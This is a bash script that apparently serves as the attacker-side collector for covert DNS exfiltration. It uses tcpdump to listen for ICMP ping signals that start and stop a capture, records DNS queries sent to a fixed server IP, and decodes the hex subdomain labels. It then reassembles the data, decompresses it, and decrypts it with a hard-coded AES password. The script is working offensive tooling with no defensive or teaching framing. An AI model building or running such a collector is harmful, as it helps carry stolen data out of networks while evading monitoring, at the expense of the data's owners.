#!/bin/bash

p="/root/xfil/ping.out"
x="/root/xfil/xfil.tcp"
svr=192.168.181.173


listen_for_signal()
{
  echo Listening for signals...
  tcpdump -i eth0 'icmp[icmptype] = icmp-echo' -l |tee $p &
}

start_catch()
{
  echo "Starting catch..."
  tcpdump -vvv -s 0 -l -n port 53 > $x &
  echo "Waiting for dns xfil to complete..."
  sleep 30 ## may want to extend this, depending on data size...
  fsize=$(du -sb $x | awk '{ print $1 }')
  if [ $fsize -gt 10 ]; then
    echo caught exfil request
    parse_data $x
  fi
}

stop_catch()
{
  pkill tcpdump ## stop the catch
  echo "Stopping catch..."
  listen_for_signal  ## start a new command signal listenter
  cleanup
}


parse_signal()
{
  echo Parsing signal file...
  
  if [[ -f $p ]]; then
    awk '/86|66|96/' $p > $p.awk.start
    fsize=$(du -sb $p.awk.start | awk '{ print $1 }')
     if [ $fsize -gt 10 ]; then
      echo "Caught DNS xfil request"
      start_catch 
     fi
    
    awk '/126|136|146/' $p > $p.awk.stop
    fsize=$(du -sb $p.awk.stop | awk '{ print $1 }')
     if [ $fsize -gt 10 ]; then
      echo "Caught DNS xfil stop"
      stop_catch
     fi

  fi

}

cleanup()
{
  echo >  $p
  rm --interactive=never $p.awk.*
  rm --interactive=never $x.*
}


parse_data()
{
  egrep -o "[0-9a-f]*.$svr" $x | cut -d. -f1 | grep -v ^\ | uniq >> $x.hex
  xxd -r -p $x.hex > $x.gz
  tar zxvf $x.gz -O > $x.xpand
  openssl aes-256-cbc -d -in $x.xpand -out DATA.$RANDOM -k 1234
}


###MAIN
#
#listen_for_signal $file
echo starting....

while [ 1=1 ]; do
  parse_signal $file
  sleep 10
done
